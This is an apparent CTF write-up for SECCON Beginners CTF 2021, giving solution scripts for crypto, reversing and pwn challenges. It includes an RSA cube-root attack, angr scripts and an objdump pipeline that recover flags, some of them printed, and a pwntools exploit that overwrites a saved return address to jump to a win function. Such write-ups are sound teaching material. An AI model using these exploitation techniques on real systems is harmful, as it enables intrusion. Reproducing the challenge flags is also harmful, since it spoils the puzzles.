# SECCON Beginners CTF 2021

- https://github.com/SECCON/Beginners_CTF_2021

## Crypto

### simple_RSA

- https://www.youtube.com/watch?v=VtnqS3VdJ3Y&t=170s

#### Solution 1

```python
#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes
import gmpy2
e = 3
c = 213791751530017111508691084168363024686878057337971319880256924185393737150704342725042841488547315925971960389230453332319371876092968032513149023976287158698990251640298360876589330810813199260879441426084508864252450551111064068694725939412142626401778628362399359107132506177231354040057205570428678822068599327926328920350319336256613
print(long_to_bytes(gmpy2.iroot(c, e)[0]).decode())
```

## reversing

### be_angry

#### Solution 1


```python
#!/usr/bin/env python3
import angr
import claripy
proj = angr.Project('./chall', auto_load_libs=False)
N = 64
PREFIX = b'ctf4b{'
inp = claripy.BVS('inp', 8*N)
state = proj.factory.entry_state(stdin=inp)
for c in inp.chop(8):
    state.solver.add(
        claripy.Or(claripy.And(0x20 <= c, c <= 0x7e), c == 0, c == 0xa))
for i, ch in enumerate(PREFIX):
    state.solver.add(inp.get_byte(i) == ch)
simgr = proj.factory.simgr(state)
simgr.explore(find=lambda s: b'Correct!!' in s.posix.dumps(1),
              avoid=lambda s: b'Incorrect!!' in s.posix.dumps(1))
if simgr.found:
    found = simgr.found[0]
    flag = found.solver.eval(inp, cast_to=bytes)
    print('FLAG:', flag.split(b'\0')[0].decode())
else:
    print('No solution found')
```

### only_read

#### Solution 1

```zsh
objdump -d -M intel ./chall|grep 'cmp[ ]\+al,'|grep -o '..$'|tr -d '\n'|xxd -r -p
ctf4b{c0n5t4nt_f0ld1ng}
```

#### Solution 2

```python
#!/usr/bin/env python3
import angr
import claripy
proj = angr.Project('./chall', auto_load_libs=False)
N = 64
PREFIX = b'ctf4b{'
inp = claripy.BVS('inp', 8*N)
state = proj.factory.entry_state(stdin=inp)
for c in inp.chop(8):
    state.solver.add(
        claripy.Or(claripy.And(0x20 <= c, c <= 0x7e), c == 0, c == 0xa))
for i, ch in enumerate(PREFIX):
    state.solver.add(inp.get_byte(i) == ch)
simgr = proj.factory.simgr(state)
simgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1),
              avoid=lambda s: b'Incorrect' in s.posix.dumps(1))
if simgr.found:
    found = simgr.found[0]
    flag = found.solver.eval(inp, cast_to=bytes)
    print('FLAG:', flag.split(b'\0')[0].decode())
else:
    print('No solution found')
```

## pwn

### rewriter

#### Solution1

```zsh
readelf -s ./chall|grep win
    67: 00000000004011f6    69 FUNC    GLOBAL DEFAULT   15 win
```

```python
#!/usr/bin/env python3
from pwn import ELF, context, gdb, log, process, remote
exe = context.binary = ELF('chall')
# io = process([exe.path])
# io = gdb.debug([exe.path], gdbscript='b main \n c')
io = remote('::1', 4103)
# context.log_level = 'debug'
saved_rip = b''
win_addr = 0x00000000004011f6
while True:
    line = io.recvline()
    if b'saved ret addr' in line:
        saved_rip = line[1:].split(b' | ', 2)[0]
        break
log.info('saved RIP: %#x', saved_rip)
io.sendlineafter(b'> ', saved_rip)
io.sendlineafter(b' = ', hex(win_addr))
io.interactive()
```
